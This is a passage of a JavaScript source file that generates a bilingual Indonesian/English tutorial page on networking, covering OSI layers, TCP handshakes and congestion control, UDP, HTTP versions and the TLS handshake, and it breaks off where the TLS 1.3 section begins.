// ====================== NETWORKING (ENHANCED) ======================
// Replaces the basic networking section with comprehensive coverage

sections['networking'] = () => `
<h1 class="section-title animate-in">${t('Jaringan & Protokol', 'Networking & Protocols')}</h1>
<p class="section-subtitle animate-in">${t('Model OSI, TCP/UDP, Evolusi HTTP, TLS, REST, gRPC, WebSocket, GraphQL, DNS & Keamanan', 'OSI Model, TCP/UDP, HTTP Evolution, TLS, REST, gRPC, WebSocket, GraphQL, DNS & Security')}</p>

<!-- ==================== 1. OSI MODEL & TCP/IP ==================== -->
<h2 class="animate-in">${t('1. Model OSI & Stack TCP/IP', '1. OSI Model & TCP/IP Stack')}</h2>

<div class="card animate-in">
    <h3 style="color:var(--accent)">OSI (Open Systems Interconnection) Model</h3>
    <p>${t('Model OSI adalah kerangka konseptual 7 layer yang menstandarisasi fungsi komunikasi jaringan. Setiap layer memiliki tanggung jawab spesifik dan berkomunikasi dengan layer di atas dan di bawahnya.', 'The OSI model is a 7-layer conceptual framework that standardizes network communication functions. Each layer has specific responsibilities and communicates with the layers above and below it.')}</p>

    <div class="layer-diagram">
        <div class="layer-item" style="background:rgba(248,113,113,0.12)">
            <div class="layer-num" style="background:var(--red);color:#fff">7</div>
            <div class="layer-info">
                <strong style="color:var(--red)">Application Layer</strong>
                <span>${t('Interaksi langsung dengan pengguna. Protokol: HTTP, FTP, SMTP, DNS, SSH, SNMP', 'Direct interaction with users. Protocols: HTTP, FTP, SMTP, DNS, SSH, SNMP')}</span>
            </div>
        </div>
        <div class="layer-item" style="background:rgba(251,146,60,0.12)">
            <div class="layer-num" style="background:var(--orange);color:#fff">6</div>
            <div class="layer-info">
                <strong style="color:var(--orange)">Presentation Layer</strong>
                <span>${t('Enkripsi, kompresi, konversi format. SSL/TLS, JPEG, ASCII, MIME', 'Encryption, compression, format conversion. SSL/TLS, JPEG, ASCII, MIME')}</span>
            </div>
        </div>
        <div class="layer-item" style="background:rgba(251,191,36,0.12)">
            <div class="layer-num" style="background:var(--yellow);color:#000">5</div>
            <div class="layer-info">
                <strong style="color:var(--yellow)">Session Layer</strong>
                <span>${t('Membuat, mengelola, mengakhiri sesi. NetBIOS, RPC, PPTP', 'Creates, manages, terminates sessions. NetBIOS, RPC, PPTP')}</span>
            </div>
        </div>
        <div class="layer-item" style="background:rgba(52,211,153,0.12)">
            <div class="layer-num" style="background:var(--green);color:#fff">4</div>
            <div class="layer-info">
                <strong style="color:var(--green)">Transport Layer</strong>
                <span>${t('Segmentasi, flow control, error recovery. TCP, UDP, SCTP, QUIC', 'Segmentation, flow control, error recovery. TCP, UDP, SCTP, QUIC')}</span>
            </div>
        </div>
        <div class="layer-item" style="background:rgba(56,189,248,0.12)">
            <div class="layer-num" style="background:var(--accent);color:#fff">3</div>
            <div class="layer-info">
                <strong style="color:var(--accent)">Network Layer</strong>
                <span>${t('Routing dan addressing logis. IP, ICMP, ARP, OSPF, BGP', 'Logical routing and addressing. IP, ICMP, ARP, OSPF, BGP')}</span>
            </div>
        </div>
        <div class="layer-item" style="background:rgba(167,139,250,0.12)">
            <div class="layer-num" style="background:var(--accent3);color:#fff">2</div>
            <div class="layer-info">
                <strong style="color:var(--accent3)">Data Link Layer</strong>
                <span>Frame, MAC address, error detection. Ethernet, Wi-Fi (802.11), PPP</span>
            </div>
        </div>
        <div class="layer-item" style="background:rgba(236,72,153,0.12)">
            <div class="layer-num" style="background:#ec4899;color:#fff">1</div>
            <div class="layer-info">
                <strong style="color:#ec4899">Physical Layer</strong>
                <span>${t('Sinyal elektrik/optik, kabel, frekuensi. Ethernet cable, fiber optic, radio waves', 'Electrical/optical signals, cables, frequencies. Ethernet cable, fiber optic, radio waves')}</span>
            </div>
        </div>
    </div>
</div>

<div class="card-grid animate-in">
    <div class="card">
        <h3 style="color:var(--green)">TCP/IP Model (4 Layer)</h3>
        <p>${t('Model praktis yang digunakan di internet sesungguhnya:', 'The practical model used in the actual internet:')}</p>
        <div class="layer-diagram">
            <div class="layer-item" style="background:rgba(248,113,113,0.12)">
                <div class="layer-num" style="background:var(--red);color:#fff">4</div>
                <div class="layer-info">
                    <strong style="color:var(--red)">Application</strong>
                    <span>= OSI Layer 5+6+7 (HTTP, DNS, FTP)</span>
                </div>
            </div>
            <div class="layer-item" style="background:rgba(52,211,153,0.12)">
                <div class="layer-num" style="background:var(--green);color:#fff">3</div>
                <div class="layer-info">
                    <strong style="color:var(--green)">Transport</strong>
                    <span>= OSI Layer 4 (TCP, UDP)</span>
                </div>
            </div>
            <div class="layer-item" style="background:rgba(56,189,248,0.12)">
                <div class="layer-num" style="background:var(--accent);color:#fff">2</div>
                <div class="layer-info">
                    <strong style="color:var(--accent)">Internet</strong>
                    <span>= OSI Layer 3 (IP, ICMP)</span>
                </div>
            </div>
            <div class="layer-item" style="background:rgba(167,139,250,0.12)">
                <div class="layer-num" style="background:var(--accent3);color:#fff">1</div>
                <div class="layer-info">
                    <strong style="color:var(--accent3)">Network Access</strong>
                    <span>= OSI Layer 1+2 (Ethernet, Wi-Fi)</span>
                </div>
            </div>
        </div>
    </div>
    <div class="card">
        <h3 style="color:var(--accent)">Data Encapsulation</h3>
        <p>${t('Saat data turun melalui layer, setiap layer menambahkan header-nya sendiri:', 'As data descends through layers, each layer adds its own header:')}</p>
        <div class="pipeline">
            <div class="pipeline-stage">
                <div class="stage-title">Data</div>
                <div class="stage-desc">Application</div>
            </div>
            <div class="pipeline-stage">
                <div class="stage-title">Segment</div>
                <div class="stage-desc">+ TCP/UDP Header</div>
            </div>
            <div class="pipeline-stage">
                <div class="stage-title">Packet</div>
                <div class="stage-desc">+ IP Header</div>
            </div>
            <div class="pipeline-stage">
                <div class="stage-title">Frame</div>
                <div class="stage-desc">+ MAC Header + Trailer</div>
            </div>
            <div class="pipeline-stage">
                <div class="stage-title">Bits</div>
                <div class="stage-desc">${t('Signal fisik', 'Physical signal')}</div>
            </div>
        </div>
        <div class="info-box">
            <strong>${t('Ingat!', 'Remember!')}</strong> ${t('Encapsulation = data dibungkus saat turun. De-encapsulation = header dibuka saat naik di sisi penerima.', 'Encapsulation = data is wrapped going down. De-encapsulation = headers are unwrapped going up on the receiver side.')}
        </div>
    </div>
</div>

<!-- ==================== 2. TCP PROTOCOL DEEP DIVE ==================== -->
<h2 class="animate-in">2. TCP Protocol Deep Dive</h2>

<div class="card animate-in">
    <h3 style="color:var(--accent)">TCP 3-Way Handshake</h3>
    <p>${t('Sebelum data bisa dikirim melalui TCP, client dan server harus membangun koneksi melalui', 'Before data can be sent via TCP, the client and server must establish a connection through a')} <strong>3-way handshake</strong>:</p>

    <div class="handshake-vis">
        <div class="handshake-col">
            <div class="handshake-label">Client</div>
            <div class="handshake-label">Server</div>
        </div>
        <div class="handshake-msgs">
            <div class="hs-msg">
                <div class="hs-text">SYN (seq=x)</div>
                <div class="hs-arrow"></div>
            </div>
            <div class="hs-msg reverse">
                <div class="hs-arrow"></div>
                <div class="hs-text">SYN-ACK (seq=y, ack=x+1)</div>
            </div>
            <div class="hs-msg">
                <div class="hs-text">ACK (ack=y+1)</div>
                <div class="hs-arrow"></div>
            </div>
        </div>
    </div>

    <div class="step-list">
        <div class="step-item">
            <div class="step-num">1</div>
            <div class="step-text"><strong>SYN:</strong> ${t('Client mengirim paket SYN dengan sequence number acak (misal x=1000). Client masuk state SYN_SENT.', 'Client sends a SYN packet with a random sequence number (e.g. x=1000). Client enters SYN_SENT state.')}</div>
        </div>
        <div class="step-item">
            <div class="step-num">2</div>
            <div class="step-text"><strong>SYN-ACK:</strong> ${t('Server menerima SYN, membalas dengan SYN-ACK. Server membuat sequence number sendiri (y=5000) dan acknowledge x+1. Server masuk state SYN_RECEIVED.', 'Server receives SYN, replies with SYN-ACK. Server creates its own sequence number (y=5000) and acknowledges x+1. Server enters SYN_RECEIVED state.')}</div>
        </div>
        <div class="step-item">
            <div class="step-num">3</div>
            <div class="step-text"><strong>ACK:</strong> ${t('Client menerima SYN-ACK, mengirim ACK dengan ack=y+1. Kedua pihak masuk state ESTABLISHED. Koneksi siap!', 'Client receives SYN-ACK, sends ACK with ack=y+1. Both parties enter ESTABLISHED state. Connection ready!')}</div>
        </div>
    </div>
</div>

<div class="card animate-in">
    <h3 style="color:var(--red)">TCP 4-Way Termination (Connection Teardown)</h3>
    <p>${t('Menutup koneksi TCP memerlukan 4 langkah karena koneksi TCP bersifat', 'Closing a TCP connection requires 4 steps because TCP connections are')} <strong>full-duplex</strong> ${t('(kedua arah harus ditutup terpisah):', '(both directions must be closed separately):')}</p>

    <div class="handshake-vis">
        <div class="handshake-col">
            <div class="handshake-label">Initiator</div>
            <div class="handshake-label">Receiver</div>
        </div>
        <div class="handshake-msgs">
            <div class="hs-msg">
                <div class="hs-text">FIN</div>
                <div class="hs-arrow"></div>
            </div>
            <div class="hs-msg reverse">
                <div class="hs-arrow"></div>
                <div class="hs-text">ACK</div>
            </div>
            <div class="hs-msg reverse">
                <div class="hs-arrow"></div>
                <div class="hs-text">FIN</div>
            </div>
            <div class="hs-msg">
                <div class="hs-text">ACK</div>
                <div class="hs-arrow"></div>
            </div>
        </div>
    </div>
    <p>${t('Setelah ACK terakhir, initiator masuk state', 'After the last ACK, the initiator enters')} <strong>TIME_WAIT</strong> ${t('selama 2*MSL (Maximum Segment Lifetime, biasanya 60 detik) untuk memastikan semua paket lama sudah expired.', 'for 2*MSL (Maximum Segment Lifetime, usually 60 seconds) to ensure all old packets have expired.')}</p>
</div>

<div class="card-grid animate-in">
    <div class="card">
        <h3 style="color:var(--green)">Flow Control (Sliding Window)</h3>
        <p>${t('Receiver mengontrol kecepatan pengiriman data dengan memberitahu', 'The receiver controls the data sending rate by advertising the')} <strong>window size</strong> ${t('(jumlah byte yang bisa diterima tanpa ACK).', '(number of bytes that can be received without ACK).')}</p>
        <div class="code-block"><span class="cm">// Sliding Window Concept</span>
Sender Window: [1][2][3][4][5][6][7][8][9][10]
               |--- sent, awaiting ACK ---|-- can send --|
                                          ^window slides right
                                           saat ACK diterima

<span class="cm">// Receiver advertises: Window Size = 4</span>
Sender kirim: [1][2][3][4]  <span class="cm">// max 4 sekaligus</span>
ACK 1 diterima: slide right
Sender kirim: [5]           <span class="cm">// window bergeser</span></div>
        <p>${t('Jika receiver kewalahan, ia mengirim window size=0', 'If the receiver is overwhelmed, it sends window size=0')} (<strong>zero window</strong>)${t(', dan sender berhenti mengirim sampai window dibuka kembali.', ', and the sender stops sending until the window reopens.')}</p>
    </div>
    <div class="card">
        <h3 style="color:var(--orange)">Congestion Control</h3>
        <p>${t('TCP mengatur laju pengiriman untuk menghindari', 'TCP regulates the sending rate to avoid')} <strong>network congestion</strong>:</p>
        <ul>
            <li><strong>Slow Start:</strong> ${t('Mulai dengan cwnd=1 MSS, gandakan setiap RTT (exponential growth) sampai threshold (ssthresh)', 'Start with cwnd=1 MSS, double every RTT (exponential growth) until threshold (ssthresh)')}</li>
            <li><strong>Congestion Avoidance:</strong> ${t('Setelah ssthresh, naikkan cwnd secara linear (+1 MSS per RTT)', 'After ssthresh, increase cwnd linearly (+1 MSS per RTT)')}</li>
            <li><strong>Fast Retransmit:</strong> ${t('Jika 3 duplicate ACK diterima, langsung retransmit tanpa tunggu timeout', 'If 3 duplicate ACKs are received, retransmit immediately without waiting for timeout')}</li>
            <li><strong>Fast Recovery (AIMD):</strong> ${t('Setelah fast retransmit, kurangi ssthresh jadi cwnd/2, lalu congestion avoidance', 'After fast retransmit, reduce ssthresh to cwnd/2, then congestion avoidance')}</li>
        </ul>
        <div class="info-box">
            <strong>AIMD</strong> = Additive Increase, Multiplicative Decrease. ${t('Naikkan pelan-pelan, turunkan drastis saat congestion. Ini menciptakan pola "sawtooth" pada grafik throughput TCP.', 'Increase slowly, decrease drastically during congestion. This creates the "sawtooth" pattern on TCP throughput graphs.')}
        </div>
    </div>
</div>

<div class="card animate-in">
    <h3 style="color:var(--accent3)">Reliable Delivery & Retransmission</h3>
    <p>${t('TCP menjamin setiap byte sampai dengan benar dan berurutan melalui mekanisme:', 'TCP guarantees every byte arrives correctly and in order through these mechanisms:')}</p>
    <div class="card-grid">
        <div class="card">
            <h4>Sequence & Acknowledgment Numbers</h4>
            <p>${t('Setiap byte memiliki nomor urut. Receiver mengirim ACK dengan nomor byte berikutnya yang diharapkan.', 'Every byte has a sequence number. The receiver sends an ACK with the next expected byte number.')}</p>
        </div>
        <div class="card">
            <h4>Retransmission Timeout (RTO)</h4>
            <p>${t('Jika ACK tidak diterima dalam RTO, paket dikirim ulang. RTO dihitung dinamis berdasarkan RTT.', 'If ACK is not received within RTO, the packet is retransmitted. RTO is dynamically calculated based on RTT.')}</p>
        </div>
        <div class="card">
            <h4>Checksum</h4>
            <p>${t('Setiap segment memiliki checksum untuk mendeteksi korupsi data. Segment yang rusak di-drop dan akan di-retransmit.', 'Every segment has a checksum to detect data corruption. Corrupted segments are dropped and retransmitted.')}</p>
        </div>
        <div class="card">
            <h4>Selective ACK (SACK)</h4>
            <p>${t('Receiver bisa memberitahu segmen mana yang sudah diterima, sehingga sender hanya mengirim ulang yang hilang.', 'The receiver can report which segments have been received, so the sender only retransmits the missing ones.')}</p>
        </div>
    </div>
</div>

<div class="card animate-in">
    <h3>TCP Handshake Animation</h3>
    <div class="anim-container">
        <canvas id="canvas-tcp-handshake" width="700" height="320" style="width:100%;max-width:700px;background:var(--surface);border-radius:8px"></canvas>
    </div>
    <div class="anim-controls">
        <button class="anim-btn" onclick="tcpHandshakeAnim.start()">Play Handshake</button>
        <button class="anim-btn" onclick="tcpHandshakeAnim.reset()">Reset</button>
    </div>
</div>

<!-- ==================== 3. UDP PROTOCOL ==================== -->
<h2 class="animate-in">3. UDP (User Datagram Protocol)</h2>

<div class="card animate-in">
    <h3 style="color:var(--green)">${t('Karakteristik UDP', 'UDP Characteristics')}</h3>
    <p>${t('UDP adalah protokol transport', 'UDP is a')} <strong>connectionless</strong> ${t('dan', 'and')} <strong>unreliable</strong> ${t('yang menawarkan kecepatan tinggi dengan overhead minimal.', 'transport protocol that offers high speed with minimal overhead.')}</p>

    <div class="card-grid">
        <div class="card">
            <h4>Connectionless</h4>
            <p>${t('Tidak ada handshake. Langsung kirim datagram tanpa membangun koneksi terlebih dahulu. Setiap datagram independen.', 'No handshake. Sends datagrams directly without establishing a connection first. Each datagram is independent.')}</p>
        </div>
        <div class="card">
            <h4>Unreliable (Best Effort)</h4>
            <p>${t('Tidak ada jaminan pengiriman, urutan, atau integritas. Paket bisa hilang, duplikat, atau tiba tidak berurutan.', 'No guarantee of delivery, order, or integrity. Packets can be lost, duplicated, or arrive out of order.')}</p>
        </div>
        <div class="card">
            <h4>Lightweight Header</h4>
            <p>${t('Hanya 8 byte header (vs TCP 20-60 byte): Source Port, Dest Port, Length, Checksum.', 'Only 8-byte header (vs TCP 20-60 bytes): Source Port, Dest Port, Length, Checksum.')}</p>
        </div>
        <div class="card">
            <h4>No Flow/Congestion Control</h4>
            <p>${t('Aplikasi bertanggung jawab sendiri atas pengaturan kecepatan pengiriman data.', 'The application is responsible for managing data sending rate on its own.')}</p>
        </div>
    </div>

    <h4 style="margin-top:16px">Use Cases UDP</h4>
    <div class="card-grid-3">
        <div class="card">
            <span class="badge badge-green">Real-time Gaming</span>
            <p>${t('Latency lebih penting dari reliability. Kehilangan 1-2 paket posisi karakter tidak masalah.', 'Latency is more important than reliability. Losing 1-2 character position packets is acceptable.')}</p>
        </div>
        <div class="card">
            <span class="badge badge-blue">Video/Audio Streaming</span>
            <p>${t('RTP/RTSP berjalan di atas UDP. Buffering menangani packet loss. Retransmit akan menyebabkan delay.', 'RTP/RTSP runs on top of UDP. Buffering handles packet loss. Retransmitting would cause delay.')}</p>
        </div>
        <div class="card">
            <span class="badge badge-orange">DNS Lookups</span>
            <p>${t('Query kecil (biasanya < 512 byte), satu request-response. Jika hilang, cukup kirim ulang dari aplikasi.', 'Small queries (usually < 512 bytes), single request-response. If lost, just resend from the application.')}</p>
        </div>
    </div>
</div>

<div class="card animate-in">
    <h3>${t('TCP vs UDP Perbandingan Lengkap', 'TCP vs UDP Complete Comparison')}</h3>
    <div class="table-wrapper">
    <table>
    <tr><th>${t('Aspek', 'Aspect')}</th><th>TCP</th><th>UDP</th></tr>
    <tr><td>${t('Koneksi', 'Connection')}</td><td>Connection-oriented (3-way handshake)</td><td>Connectionless</td></tr>
    <tr><td>Reliability</td><td>Guaranteed delivery, retransmission</td><td>Best effort, no guarantee</td></tr>
    <tr><td>Ordering</td><td>${t('Data diterima berurutan', 'Data received in order')}</td><td>${t('Tidak ada jaminan urutan', 'No order guarantee')}</td></tr>
    <tr><td>Flow Control</td><td>${t('Ya', 'Yes')} (sliding window)</td><td>${t('Tidak ada', 'None')}</td></tr>
    <tr><td>Congestion Control</td><td>${t('Ya', 'Yes')} (slow start, AIMD)</td><td>${t('Tidak ada', 'None')}</td></tr>
    <tr><td>Header Size</td><td>20-60 bytes</td><td>8 bytes</td></tr>
    <tr><td>Speed</td><td>${t('Lebih lambat (overhead)', 'Slower (overhead)')}</td><td>${t('Lebih cepat (minimal overhead)', 'Faster (minimal overhead)')}</td></tr>
    <tr><td>Broadcast/Multicast</td><td>${t('Tidak support', 'Not supported')}</td><td>Support</td></tr>
    <tr><td>State</td><td>Stateful (ESTABLISHED, etc)</td><td>Stateless</td></tr>
    <tr><td>Error Checking</td><td>Checksum + recovery</td><td>Checksum only (${t('optional di IPv4', 'optional in IPv4')})</td></tr>
    <tr><td>Use Case</td><td>Web, email, file transfer, SSH</td><td>Gaming, streaming, DNS, VoIP, IoT</td></tr>
    </table>
    </div>
</div>

<!-- ==================== 4. HTTP EVOLUTION ==================== -->
<h2 class="animate-in">${t('4. Evolusi HTTP: 1.0', '4. HTTP Evolution: 1.0')} &rarr; 1.1 &rarr; 2 &rarr; 3</h2>

<div class="tabs animate-in">
    <button class="tab-btn active" data-tab="http10">HTTP/1.0</button>
    <button class="tab-btn" data-tab="http11">HTTP/1.1</button>
    <button class="tab-btn" data-tab="http2">HTTP/2</button>
    <button class="tab-btn" data-tab="http3">HTTP/3</button>
</div>

<div data-tab-content="http10" class="tab-content active">
<div class="card">
    <h3 style="color:var(--red)">HTTP/1.0 (1996)</h3>
    <p>${t('Versi pertama yang terstandardisasi. Setiap request membutuhkan', 'The first standardized version. Each request requires a')} <strong>${t('koneksi TCP baru', 'new TCP connection')}</strong>.</p>

    <div class="packet-vis">
        <div class="packet-flow">
            <div class="packet-endpoint">Client</div>
            <div class="packet-line"><div class="packet-msg" style="left:20%">TCP Connect</div></div>
            <div class="packet-endpoint">Server</div>
        </div>
        <div class="packet-flow">
            <div class="packet-endpoint">Client</div>
            <div class="packet-line"><div class="packet-msg" style="left:30%">GET /index.html</div></div>
            <div class="packet-endpoint">Server</div>
        </div>
        <div class="packet-flow">
            <div class="packet-endpoint">Client</div>
            <div class="packet-line"><div class="packet-msg" style="left:10%">TCP Close + Reconnect</div></div>
            <div class="packet-endpoint">Server</div>
        </div>
        <div class="packet-flow">
            <div class="packet-endpoint">Client</div>
            <div class="packet-line"><div class="packet-msg" style="left:30%">GET /style.css</div></div>
            <div class="packet-endpoint">Server</div>
        </div>
    </div>

    <div class="warn-box">
        <strong>${t('Masalah utama:', 'Main problem:')}</strong> ${t('Setiap resource (HTML, CSS, JS, gambar) memerlukan TCP handshake baru. Sangat lambat untuk halaman modern yang memuat 50+ resource!', 'Each resource (HTML, CSS, JS, images) requires a new TCP handshake. Very slow for modern pages loading 50+ resources!')}
    </div>

    <ul>
        <li>${t('Satu request per koneksi TCP', 'One request per TCP connection')}</li>
        <li>${t('Tidak ada persistent connection (default)', 'No persistent connection (default)')}</li>
        <li>${t('Header dalam format teks (plaintext)', 'Headers in text format (plaintext)')}</li>
        <li>${t('Tidak ada host header (satu IP = satu website)', 'No host header (one IP = one website)')}</li>
    </ul>
</div>
</div>

<div data-tab-content="http11" class="tab-content">
<div class="card">
    <h3 style="color:var(--orange)">HTTP/1.1 (1997)</h3>
    <p>${t('Peningkatan besar dengan', 'Major improvement with')} <strong>persistent connections</strong> ${t('dan', 'and')} <strong>pipelining</strong>${t(', tapi masih punya masalah.', ', but still has issues.')}</p>

    <div class="card-grid">
        <div class="card">
            <h4 style="color:var(--green)">${t('Perbaikan dari 1.0', 'Improvements from 1.0')}</h4>
            <ul>
                <li><strong>Keep-Alive (default):</strong> ${t('Satu koneksi TCP untuk banyak request', 'One TCP connection for multiple requests')}</li>
                <li><strong>Pipelining:</strong> ${t('Kirim beberapa request tanpa tunggu response (tapi jarang diimplementasi)', 'Send multiple requests without waiting for response (but rarely implemented)')}</li>
                <li><strong>Host header:</strong> ${t('Virtual hosting (banyak domain di satu IP)', 'Virtual hosting (multiple domains on one IP)')}</li>
                <li><strong>Chunked transfer encoding:</strong> Streaming response</li>
                <li><strong>Cache control:</strong> ETag, If-Modified-Since</li>
            </ul>
        </div>
        <div class="card">
            <h4 style="color:var(--red)">${t('Masalah yang tersisa', 'Remaining issues')}</h4>
            <ul>
                <li><strong>Head-of-Line Blocking:</strong> ${t('Response harus dikirim berurutan. Jika response pertama lambat, semuanya menunggu!', 'Responses must be sent in order. If the first response is slow, everything waits!')}</li>
                <li><strong>Header bloat:</strong> ${t('Header dikirim ulang setiap request (cookies bisa ratusan byte)', 'Headers resent on every request (cookies can be hundreds of bytes)')}</li>
                <li><strong>Workaround:</strong> ${t('Domain sharding (buka 6 koneksi ke beda subdomain), CSS sprites, inlining', 'Domain sharding (open 6 connections to different subdomains), CSS sprites, inlining')}</li>
            </ul>
        </div>
    </div>

    <div class="code-block"><span class="cm">// HTTP/1.1 Head-of-Line Blocking</span>
Connection 1: GET /a.js ------[SLOW]-------> Response a.js
              GET /b.css                    <span class="cm">// BLOCKED! Harus tunggu a.js</span>
              GET /c.png                    <span class="cm">// BLOCKED!</span>

<span class="cm">// Workaround: buka multiple connections</span>
Connection 1: GET /a.js ------[SLOW]------->
Connection 2: GET /b.css ----> Response b.css  <span class="cm">// OK, koneksi terpisah</span>
Connection 3: GET /c.png ----> Response c.png  <span class="cm">// OK</span></div>
</div>
</div>

<div data-tab-content="http2" class="tab-content">
<div class="card">
    <h3 style="color:var(--accent)">${t('HTTP/2 (2015) - Berbasis SPDY Google', 'HTTP/2 (2015) - Based on Google SPDY')}</h3>
    <p>${t('Revolusi besar!', 'Major revolution!')} <strong>Multiplexing</strong> ${t('menyelesaikan head-of-line blocking di level HTTP (tapi masih ada di TCP level).', 'solves head-of-line blocking at the HTTP level (but it still exists at the TCP level).')}</p>

    <div class="card-grid">
        <div class="card">
            <h4 style="color:var(--accent)">${t('Fitur Utama', 'Key Features')}</h4>
            <ul>
                <li><strong>Binary Framing:</strong> ${t('Bukan text lagi! Data dipecah jadi frame binary yang efisien', 'No longer text! Data is split into efficient binary frames')}</li>
                <li><strong>Multiplexing:</strong> ${t('Banyak request/response bersamaan di SATU koneksi TCP', 'Multiple concurrent requests/responses over ONE TCP connection')}</li>
                <li><strong>Header Compression (HPACK):</strong> ${t('Header di-compress dan di-cache (static + dynamic table)', 'Headers are compressed and cached (static + dynamic table)')}</li>
                <li><strong>Server Push:</strong> ${t('Server bisa mengirim resource sebelum diminta client', 'Server can send resources before the client requests them')}</li>
                <li><strong>Stream Prioritization:</strong> ${t('Client bisa menentukan prioritas resource', 'Client can set resource priorities')}</li>
            </ul>
        </div>
        <div class="card">
            <h4 style="color:var(--green)">Multiplexing Visual</h4>
            <div class="code-block"><span class="cm">// Satu koneksi TCP, banyak stream paralel</span>
Stream 1: [Frame: GET /a.js  ] ====>
Stream 2: [Frame: GET /b.css ] ====>
Stream 3: [Frame: GET /c.png ] ====>
                    |
           Semua INTERLEAVED di satu koneksi!
                    |
Stream 1: <==== [Frame: Response a.js  ]
Stream 3: <==== [Frame: Response c.png ] <span class="cm">// c.png bisa duluan!</span>
Stream 2: <==== [Frame: Response b.css ]</div>
        </div>
    </div>

    <div class="warn-box">
        <strong>Masalah tersisa:</strong> TCP head-of-line blocking! Jika satu TCP packet hilang, SEMUA stream di koneksi itu terhenti sampai packet di-retransmit. Ini karena TCP tidak tahu tentang HTTP/2 streams.
    </div>
</div>
</div>

<div data-tab-content="http3" class="tab-content">
<div class="card">
    <h3 style="color:var(--green)">HTTP/3 (2022) - Berbasis QUIC</h3>
    <p>HTTP/3 mengganti TCP dengan <strong>QUIC</strong> (dibangun di atas UDP) untuk menyelesaikan TCP head-of-line blocking sepenuhnya!</p>

    <div class="card-grid">
        <div class="card">
            <h4 style="color:var(--green)">QUIC Protocol</h4>
            <ul>
                <li>Transport layer baru berbasis <strong>UDP</strong></li>
                <li>Menangani reliability, ordering, congestion control SENDIRI</li>
                <li>Setiap stream independen - packet loss di satu stream tidak mempengaruhi stream lain!</li>
                <li>Built-in encryption (TLS 1.3 terintegrasi)</li>
                <li>Connection migration (pindah jaringan tanpa putus koneksi)</li>
            </ul>
        </div>
        <div class="card">
            <h4 style="color:var(--accent)">0-RTT Connection</h4>
            <ul>
                <li><strong>First connection:</strong> 1-RTT (vs TCP+TLS = 3 RTT)</li>
                <li><strong>Subsequent connections:</strong> 0-RTT! Kirim data langsung pakai session ticket sebelumnya</li>
                <li>Header compression: <strong>QPACK</strong> (evolusi HPACK, stream-friendly)</li>
                <li>No domain sharding needed (satu koneksi sangat efisien)</li>
            </ul>
        </div>
    </div>

    <div class="success-box">
        <strong>HTTP/3 menyelesaikan semua masalah generasi sebelumnya:</strong> No head-of-line blocking (stream-level independence), koneksi cepat (0-RTT), built-in encryption, dan connection migration. Sudah digunakan oleh Google, Cloudflare, dan Meta.
    </div>
</div>
</div>

<div class="card animate-in">
    <h3>Perbandingan HTTP Versions</h3>
    <div class="table-wrapper">
    <table>
    <tr><th>Feature</th><th>HTTP/1.0</th><th>HTTP/1.1</th><th>HTTP/2</th><th>HTTP/3</th></tr>
    <tr><td>Tahun</td><td>1996</td><td>1997</td><td>2015</td><td>2022</td></tr>
    <tr><td>Transport</td><td>TCP</td><td>TCP</td><td>TCP + TLS</td><td><strong>QUIC (UDP)</strong></td></tr>
    <tr><td>Koneksi</td><td>Baru per request</td><td>Keep-alive</td><td>Multiplexed</td><td>Multiplexed</td></tr>
    <tr><td>HoL Blocking</td><td>Ya</td><td>Ya (per koneksi)</td><td>TCP level</td><td><strong>Tidak!</strong></td></tr>
    <tr><td>Header Compression</td><td>Tidak</td><td>Tidak</td><td>HPACK</td><td>QPACK</td></tr>
    <tr><td>Server Push</td><td>Tidak</td><td>Tidak</td><td>Ya</td><td>Ya</td></tr>
    <tr><td>Format</td><td>Text</td><td>Text</td><td>Binary frames</td><td>Binary frames</td></tr>
    <tr><td>0-RTT</td><td>Tidak</td><td>Tidak</td><td>Tidak</td><td><strong>Ya!</strong></td></tr>
    <tr><td>Encryption</td><td>Optional</td><td>Optional</td><td>Praktis wajib</td><td>Built-in (TLS 1.3)</td></tr>
    <tr><td>Connection Migration</td><td>Tidak</td><td>Tidak</td><td>Tidak</td><td><strong>Ya!</strong></td></tr>
    </table>
    </div>
</div>

<div class="card animate-in">
    <h3>HTTP Version Comparison Animation</h3>
    <div class="anim-container">
        <canvas id="canvas-http-compare" width="700" height="350" style="width:100%;max-width:700px;background:var(--surface);border-radius:8px"></canvas>
    </div>
    <div class="anim-controls">
        <button class="anim-btn" onclick="httpCompareAnim.start()">Play Comparison</button>
        <button class="anim-btn" onclick="httpCompareAnim.reset()">Reset</button>
    </div>
</div>

<!-- ==================== 5. TLS/SSL SECURITY ==================== -->
<h2 class="animate-in">5. TLS/SSL Security</h2>

<div class="card animate-in">
    <h3 style="color:var(--accent)">TLS 1.2 Handshake (Detail)</h3>
    <p>TLS (Transport Layer Security) mengamankan koneksi dengan <strong>enkripsi, autentikasi, dan integritas data</strong>. TLS 1.2 memerlukan 2 round-trip (2-RTT):</p>

    <div class="handshake-vis">
        <div class="handshake-col">
            <div class="handshake-label">Client</div>
            <div class="handshake-label">Server</div>
        </div>
        <div class="handshake-msgs">
            <div class="hs-msg">
                <div class="hs-text">ClientHello</div>
                <div class="hs-arrow"></div>
            </div>
            <div class="hs-msg reverse">
                <div class="hs-arrow"></div>
                <div class="hs-text">ServerHello + Certificate</div>
            </div>
            <div class="hs-msg reverse">
                <div class="hs-arrow"></div>
                <div class="hs-text">ServerKeyExchange + Done</div>
            </div>
            <div class="hs-msg">
                <div class="hs-text">ClientKeyExchange</div>
                <div class="hs-arrow"></div>
            </div>
            <div class="hs-msg">
                <div class="hs-text">ChangeCipherSpec + Finished</div>
                <div class="hs-arrow"></div>
            </div>
            <div class="hs-msg reverse">
                <div class="hs-arrow"></div>
                <div class="hs-text">ChangeCipherSpec + Finished</div>
            </div>
        </div>
    </div>

    <div class="step-list">
        <div class="step-item">
            <div class="step-num">1</div>
            <div class="step-text"><strong>ClientHello:</strong> Client mengirim TLS version yang didukung, daftar cipher suites, client random number, dan SNI (Server Name Indication).</div>
        </div>
        <div class="step-item">
            <div class="step-num">2</div>
            <div class="step-text"><strong>ServerHello + Certificate:</strong> Server memilih cipher suite, mengirim server random, dan sertifikat digital (berisi public key server).</div>
        </div>
        <div class="step-item">
            <div class="step-num">3</div>
            <div class="step-text"><strong>Key Exchange:</strong> Client memverifikasi sertifikat (chain of trust ke CA), lalu client dan server melakukan key exchange (DHE/ECDHE) untuk menghasilkan pre-master secret.</div>
        </div>
        <div class="step-item">
            <div class="step-num">4</div>
            <div class="step-text"><strong>Session Keys:</strong> Kedua pihak derive session keys dari pre-master secret + random values. Semua komunikasi selanjutnya dienkripsi dengan symmetric encryption (AES).</div>
        </div>
    </div>
</div>

<div class="card animate-in">
    <h3 style="color:var(--green)">TLS 1.3 Handshake (Simplified - 1-RTT)</h3>
